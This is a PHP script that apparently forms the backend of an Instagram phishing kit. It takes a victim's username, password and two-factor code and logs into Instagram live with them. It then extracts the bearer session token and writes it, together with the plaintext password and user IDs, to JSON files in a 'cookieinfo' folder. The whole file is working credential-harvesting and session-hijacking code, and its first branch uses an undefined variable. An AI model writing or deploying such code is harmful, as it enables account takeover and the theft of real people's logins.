<?php
error_reporting(0);
include 'api.php';
$api = new api();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {


    $username = isset($_POST['username']) ? htmlspecialchars(trim($_POST['username'])) : '';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';
    $code = isset($_POST['backupcode']) ? htmlspecialchars(trim($_POST['backupcode'])) : '';

    $login = $api->Loginv2($username, $password);
    $data = json_decode($login, true);


    if (isset($data['status'])) {
        if ($data['status'] === 'ok') {

            $headers = $responsefactor['headers'];
            $fbid_v2 = $data['logged_in_user']['fbid_v2'];
            $headers = explode("\r\n", $headers);
            foreach ($headers as $header) {
                if (strpos($header, 'ig-set-authorization') !== false) {
                    $bearer = trim(explode(':', $header, 2)[1]);
                    preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                    $session_json = json_decode(base64_decode($session_json[2]));
                    $user_id = $session_json->ds_user_id;

                    $api->challengefactor($bearer, $user_id);

                    $safe_username = preg_replace('/[^a-zA-Z0-9_\-]/', '_', $username);
                    $userdata = [
                        'bearer' => $bearer,
                        'user_id' => $user_id,
                        'username' => $username,
                        'password' => $password,
                        'fbid'     => $fbid_v2
                    ];
                    $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);
                    $filename = __DIR__ . '/cookieinfo/' . $safe_username . '.json';
                    file_put_contents($filename, $jsondata);

                    echo 'succeslogin';
                    exit;
                }
            }

            echo 'succeslogin';
        } elseif ($data['error_type'] === 'two_factor_required') {
            if (isset($data['two_factor_info']['two_factor_identifier'])) {
                $two_factor_identifier = $data['two_factor_info']['two_factor_identifier'];
                $responsefactor = $api->twofactorLOGİNv2($username, $two_factor_identifier, $code);
                $data = json_decode($responsefactor['body'], true);

                if (isset($data['status']) && $data['status'] === 'ok') {
                    $headers = $responsefactor['headers'];
                    $fbid_v2 = $data['logged_in_user']['fbid_v2'];
                    $headers = explode("\r\n", $headers);
                    foreach ($headers as $header) {
                        if (strpos($header, 'ig-set-authorization') !== false) {
                            $bearer = trim(explode(':', $header, 2)[1]);
                            preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                            $session_json = json_decode(base64_decode($session_json[2]));
                            $user_id = $session_json->ds_user_id;

                            $api->challengefactor($bearer, $user_id);

                            $safe_username = preg_replace('/[^a-zA-Z0-9_\-]/', '_', $username);
                            $userdata = [
                                'bearer' => $bearer,
                                'user_id' => $user_id,
                                'username' => $username,
                                'password' => $password,
                                'fbid'     => $fbid_v2
                            ];
                            $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);
                            $filename = __DIR__ . '/cookieinfo/' . $safe_username . '.json';
                            file_put_contents($filename, $jsondata);

                            echo 'succeslogin';
                            exit;
                        }
                    }
                } else {
                    echo 'badcode';
                }
            } else {
                echo 'İki faktörlü doğrulama bilgileri eksik.';
            }
        } elseif (in_array($data['error_type'], ['invalid_user', 'bad_password', 'ip_block'])) {
            echo 'wrongpassword';
        } elseif ($data['error_type'] === 'checkpoint_challenge_required') {
            echo 'challengelogin';
        } else {
            echo 'codedbymythic';
        }
    } else {
        echo 'Yanıt beklenen formatta değil.';
    }
}